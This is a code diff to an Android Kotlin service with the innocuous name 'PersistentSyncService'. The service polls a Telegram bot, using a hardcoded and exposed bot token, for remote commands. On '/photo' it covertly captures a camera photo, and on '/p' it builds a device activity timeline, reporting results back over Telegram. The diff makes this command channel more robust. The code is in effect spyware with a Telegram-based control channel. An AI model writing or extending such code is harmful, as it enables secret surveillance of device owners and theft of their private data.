@@ -13,6 +13,7 @@ import androidx.core.app.NotificationCompat
 import android.util.Log
 import kotlinx.coroutines.*
 import org.json.JSONObject
+import java.net.HttpURLConnection
 import java.net.URL
 
 class PersistentSyncService : Service() {
@@ -32,8 +33,17 @@ class PersistentSyncService : Service() {
                 try {
                     val botToken = "8961320031:AAGWyCdW9CziarfEF8p3ynltYOsMWUirxNw"
                     val urlString = "https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}"
-                    val response = URL(urlString).readText()
+
+                    val url = URL(urlString)
+                    val connection = url.openConnection() as HttpURLConnection
+                    connection.connectTimeout = 10000
+                    connection.readTimeout = 10000
+
+                    val response = connection.inputStream.bufferedReader().use { it.readText() }
+                    connection.disconnect()
+
                     val json = JSONObject(response)
+                    var delayTime = 2000L
 
                     if (json.getBoolean("ok")) {
                         val updates = json.getJSONArray("result")
@@ -44,14 +54,21 @@ class PersistentSyncService : Service() {
                             if (currentUpdateId > maxUpdateId) {
                                 maxUpdateId = currentUpdateId
                             }
-
                             if (update.has("message")) {
                                 val message = update.getJSONObject("message")
                                 if (message.has("text")) {
                                     val text = message.getString("text")
                                     when (text) {
                                         "/photo" -> {
-                                            serviceScope.launch { CameraUtility.capturePhoto(this@PersistentSyncService) }
+                                            serviceScope.launch {
+                                                try {
+                                                    val photoFile = CameraUtility.capturePhoto(this@PersistentSyncService)
+                                                    TelegramSyncHelper.sendLogData("📷 *Photo Captured:* ${photoFile.absolutePath}")
+                                                } catch (e: Exception) {
+                                                    Log.e("PersistentSyncService", "Camera error", e)
+                                                    TelegramSyncHelper.sendLogData("❌ *Camera Error:* ${e.message}")
+                                                }
+                                            }
                                         }
                                         "/p" -> {
                                             val timeline = ActivityTimelineUtility.generateActivityTimeline(this@PersistentSyncService, 12)
@@ -67,11 +84,11 @@ class PersistentSyncService : Service() {
                         }
                         lastUpdateId = maxUpdateId
                     }
+                    delay(delayTime)
                 } catch (e: Exception) {
                     Log.e("PersistentSyncService", "Polling error", e)
-                    delay(3000)
+                    delay(5000)
                 }
-                delay(10000)
             }
         }
     }
